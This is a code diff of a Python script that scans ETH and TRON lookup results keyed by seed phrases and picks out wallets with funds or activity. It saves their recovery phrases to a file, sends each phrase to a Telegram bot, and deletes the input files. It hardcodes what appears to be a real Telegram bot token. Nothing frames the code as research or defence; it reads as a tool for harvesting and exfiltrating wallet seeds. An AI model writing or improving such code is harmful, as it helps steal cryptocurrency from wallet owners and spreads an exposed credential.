@@ -8,7 +8,6 @@ import logging
 import tempfile
 import html
 import time
-from pathlib import Path
 
 try:
     import requests
@@ -17,8 +16,6 @@ except ImportError:
     import urllib.request as urllib_request
     import urllib.parse as urllib_parse
 
-ETH_RESPONSE_FILE = "ETH_scan_response.json"
-TRON_RESPONSE_FILE = "TRON_scan_response.json"
 FOUND_WALLET_FILE = "found_wallet.json"
 
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "8366276456:AAEMKoeBvj9V9P6Cbs0y_4FWNBMYFgu6O60")
@@ -90,18 +87,16 @@ def send_telegram_file(file_path, caption=None):
         return False
 
 def deliver_to_telegram(seed_phrase, chain, response_obj):
-    """Send a wallet entry to Telegram, as message or file."""
     pretty_json = json.dumps(response_obj, ensure_ascii=False, indent=2)
     escaped_json = html.escape(pretty_json)
     escaped_seed = html.escape(seed_phrase)
-    message = f" {chain} Seed: <b>{escaped_seed}</b>\n\nResponse:\n<pre>{escaped_json}</pre>"
+    message = f"🔹 {chain} Seed: <b>{escaped_seed}</b>\n\nResponse:\n<pre>{escaped_json}</pre>"
 
     if len(message) <= TELEGRAM_MESSAGE_LIMIT:
         if send_telegram_message(message):
             logger.info(f"Sent {chain} wallet to Telegram as message.")
             return True
 
-    # Fallback: send as file
     try:
         with tempfile.NamedTemporaryFile("w", delete=False, encoding="utf-8", suffix=".json") as tmp:
             tmp.write(f"Seed: {seed_phrase}\n\n")
@@ -117,28 +112,19 @@ def deliver_to_telegram(seed_phrase, chain, response_obj):
         logger.error(f"Failed to write temp file for Telegram: {e}")
         return False
 
-# -------------------- Activity Detection (Simplified) --------------------
+# -------------------- Activity Detection --------------------
 def has_eth_activity(record):
-    """
-    Check if the ETH response shows a balance > 0.
-    record is a list of ETH address entries, each with 'balance_raw'.
-    """
     for entry in record:
         balance_raw = entry.get("balance_raw", {})
         result = balance_raw.get("result", "0")
         try:
-            balance = int(result)  # result is a string like "0" or "123456789..."
-            if balance > 0:
+            if int(result) > 0:
                 return True
         except (ValueError, TypeError):
             continue
     return False
 
 def has_tron_activity(record):
-    """
-    Check if the TRON response shows that the account exists (data list is non-empty).
-    record is a list of TRON address entries, each with 'balance_raw'.
-    """
     for entry in record:
         balance_raw = entry.get("balance_raw", {})
         data = balance_raw.get("data", [])
@@ -147,21 +133,20 @@ def has_tron_activity(record):
     return False
 
 # -------------------- Main Scanner --------------------
-def process_scanner():
+def process_scanner(eth_file="ETH_scan_response.json",
+                    tron_file="TRON_scan_response.json"):
     """
-    Read ETH_scan_response.json and TRON_scan_response.json,
-    detect active wallets based on simple rules,
-    send to Telegram, append to found_wallet.json, and delete the files.
+    Scan the given response files for active wallets.
+    Send to Telegram, append to found_wallet.json, delete the files.
     """
-    logger.info("Scanner started - checking for active wallets...")
+    logger.info(f"Scanner started on {eth_file} + {tron_file}")
     active_count = 0
 
     for file_path, chain, activity_func in [
-        (ETH_RESPONSE_FILE, "ETH", has_eth_activity),
-        (TRON_RESPONSE_FILE, "TRON", has_tron_activity),
+        (eth_file, "ETH", has_eth_activity),
+        (tron_file, "TRON", has_tron_activity),
     ]:
         if not os.path.exists(file_path):
-            logger.warning(f"File {file_path} not found, skipping.")
             continue
 
         with open(file_path, "r", encoding="utf-8") as f:
@@ -178,22 +163,20 @@ def process_scanner():
                 continue
 
             seed = entry.get("seed")
-            # The response is under chain key (e.g., "eth" or "tron")
             response = entry.get(chain.lower(), [])
             if not seed or not response:
                 continue
 
-            # Check activity using the appropriate function
             if activity_func(response):
                 active_count += 1
                 logger.info(f"Active {chain} wallet found: {seed}")
-                # Append to found_wallet.json
                 with open(FOUND_WALLET_FILE, "a", encoding="utf-8") as found:
-                    found.write(json.dumps({"chain": chain, "seed": seed, "response": response}, separators=(",", ":")) + "\n")
-                # Send to Telegram
+                    found.write(json.dumps(
+                        {"chain": chain, "seed": seed, "response": response},
+                        separators=(",", ":")
+                    ) + "\n")
                 deliver_to_telegram(seed, chain, response)
 
-        # Delete the processed file after checking all lines
         try:
             os.remove(file_path)
             logger.info(f"Deleted {file_path} after processing.")
@@ -204,4 +187,6 @@ def process_scanner():
     return active_count
 
 if __name__ == "__main__":
-    process_scanner()
+    eth_file = sys.argv[1] if len(sys.argv) > 1 else "ETH_scan_response.json"
+    tron_file = sys.argv[2] if len(sys.argv) > 2 else "TRON_scan_response.json"
+    process_scanner(eth_file, tron_file)
